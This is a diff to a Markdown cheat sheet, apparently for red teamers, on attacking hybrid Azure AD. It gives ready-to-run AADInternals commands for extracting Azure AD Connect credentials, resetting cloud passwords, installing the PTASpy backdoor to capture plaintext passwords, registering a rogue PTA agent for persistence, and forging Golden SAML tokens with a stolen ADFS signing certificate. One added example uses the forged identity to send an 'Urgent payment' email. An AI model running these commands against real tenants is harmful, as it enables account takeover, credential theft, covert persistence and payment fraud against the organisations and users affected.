@@ -130,17 +130,11 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 - https://aadinternals.com/post/on-prem_admin/
 
 ## Azure AD Connect
-#### Turn on password hash sync
-- AAD Connect service account can turn on Password hash sync
-```
-Set-AADIntPasswordHashSyncEnabled -Enabled $true
-```
-
-## Password Hash Sync Abuse
 - When Azure AD Connect is configured. The `SYNC_` account and `MSOL_` account are created. (or `AAD_` if installed on a DC)
 - The `SYNC_` account has the role `Directory Synchronization Accounts` and can reset any password within the cloud and the `MSOL_` and `AAD_` account have DCSync rights.
 - The role is now shown in the Azure portal [Documentation](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#roles-not-shown-in-the-portal)
 - Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
+- A lot of the attacks uses https://github.com/Gerenios/AADInternals
 
 #### Enumerate server where Azure AD connect is installed (on prem command)
 ```
@@ -162,6 +156,13 @@ Get-ADSyncConnector
 ```
 Import-Module .\AADInternals.psd1
 Get-AADIntSyncCredentials
+```
+
+## Password Hash Sync Abuse
+#### Turn on password hash sync
+- AAD Connect service account can turn on Password hash sync
+```
+Set-AADIntPasswordHashSyncEnabled -Enabled $true
 ```
 
 ### Abusing On-Prem MSOL_ Account
@@ -214,19 +215,22 @@ Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
 - Not reliable method to check if PTA is used, Check if module is available ```Get-Command -Module PassthroughAuthPSModule```
 - Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!
 
-#### Install a backdoor (needs to be run ad administrator)
+#### Install a backdoor (needs to be run as administrator)
+- Creates a hidden folder `C:\PTASpy` and Copies a `PTASpy.dll` to `C:\PTASpy` and Injects `PTASpy.dll` to AzureADConnectAuthenticationAgentService process
 ```
 Import-Module .\AADInternals.psd1
 Install-AADIntPTASpy
 ```
 
 ### See passwords of on-prem users authenticating
-- Stored in C:\PTASpy
+- Stored in `C:\PTASpy`
 ```
+Import-Module .\AADInternals.psd1
+Get-AADIntPTASpyLog
 Get-AADIntPTASpyLog -DecodePasswords
 ```
 
-#### Register a new PTA agent
+#### Register a new PTA agent for persistence
 - After getting Global Administrator privileges by setting it on a attacker controled machine.
 ```
 Import-Module .\AADInternals.psd1
@@ -234,24 +238,26 @@ Install-AADIntPTASpy
 ```
 
 ## Federation-ADFS
+- ADFS = Active Directory Federation Services
 - Golden SAML Attack
+
 #### Get the ImmutableID
 ```
 [System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
 ```
 
-#### On ADFS server (As administrator)
+#### Get the AD FS identifier issuer:
 ```
 Get-AdfsProperties | select identifier
 ```
 
-#### Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
+#### Can check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
 ```
 Get-MsolDomainFederationSettings -DomainName <DOMAIN> | select IssuerUri
 ```
 
 #### Extract the ADFS token signing certificate
-- With DA privileges on-prem
+- If no file name is given, the certificate is exported to the current directory as ADFSSigningCertificate.pfx with empty pfx password.
 ```
 Import-Module .\AADInternals.psd1
 Export-AADIntADFSSigningCertificate
@@ -259,13 +265,33 @@ Export-AADIntADFSSigningCertificate
 
 #### Access cloud apps as any user
 ```
-Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
+Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <ISSUER> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -Verbose
 ```
 
-### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
+#### Create SAML Token
+```
+$saml=New-AADIntSAMLToken -ImmutableID <IMMUTABLE ID> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -PfxPassword "" -Issuer <ISSUER>
+```
+
+#### Get OAUTH access token used with AADInternal functions
+```
+$at=Get-AADIntAccessTokenForEXO -SAMLToken $saml
+```
+
+#### Send a message using "Outlook"
+```
+Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
+```
+
+### Creating tokens for cloud-only users
 #### Create a realistic ImmutableID
 ```
-[System.Convert]::ToBase64String((New-Guid).tobytearray())
+$ImmutableID = [System.Convert]::ToBase64String((New-Guid).tobytearray())
+```
+
+#### Set ImmutableID
+```
+Set-AADIntAzureADObject -CloudAnchor "User_7b0ad665-a751-43d7-bb9a-7b8b1e6b1c59" -SourceAnchor $ImmutableID
 ```
 
 #### Export the token signing certificate
@@ -276,5 +302,5 @@ Export-AADIntADFSSigningCertificate
 
 #### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
 ```
-Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName <PATH TO .pfx FILE> -Verbose
+Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <ISSUER> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -Verbose
 ```
